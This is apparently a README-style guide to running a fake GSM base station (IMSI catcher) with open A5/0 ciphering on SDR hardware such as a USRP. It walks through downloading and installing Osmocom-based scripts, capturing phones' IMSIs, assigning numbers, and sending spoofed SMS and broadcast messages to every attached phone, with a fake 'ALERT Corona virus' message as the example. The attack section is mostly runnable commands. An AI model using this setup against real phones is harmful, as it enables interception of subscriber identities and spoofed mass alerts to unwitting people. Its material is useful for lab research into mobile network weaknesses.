# GSM_IMSI_CATCHER_HALF_MITM
* [motorola](https://www.youtube.com/watch?v=ZKa86zAWmQY&pp=ygURZ3NtIHNuaWZmaW5nIDI5YzM%3D) documentation
* [spoofing](https://github.com/godfuzz3r/osmo-nitb-scripts/tree/master)
* [phddays]()
# Half MITM = Fake BTS only
# Why it is possible ?
* Fake base station with open ciphering named A5/0, and the  network could be GSM(sms, call), and GPRS, EDGE

# Attack limitations and advantages 
* local attack but could be targeting (to find local victim)
* victim could be reached on the real network (indeed call and sms)
* could be detectable with rooted phone and application like imsi-catcher detector, snoopsnitch because of open network

# Devices  
* USRP
* motorola phone (aka calypso phone on google)
* BladeRF
* LimeSDR
  
# Pratices
* Install DragonOS 29 or 30
* Create fake bts with open ciphering (A5/0)
* Add one users and modify core network for associating it with number 0341220590
* Send message from 0341220590 to 0341220590
* Send broadcast message

# Command you need : 
```
dmesg | grep ttyUSB*
```

# Solutions :
* Using USRP (more stable and no need synchronization of existing BTS so if we jam the existing BTS the half mitm still exists):
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts
```
```
cd osmo-nitb-scripts
```
Database is at : /var/lib/osmocom/hlr.sqlite3  
Installing all config  
```
bash install_services.sh
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Running main_uhd_spoof associate with configs/openbsc_spoof.cfg
```
python3 main_uhd_spoof.py
```
```
cd scripts_spoof1
```
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01
Tape *#001# for finding your phone number (extension with osmo-bts)
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 0341220590
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 0341220590
```
bash finding_imsi_extenstion.sh
```
```
python2 sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
python2 sending_sms_broadcast.py 
```
log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus




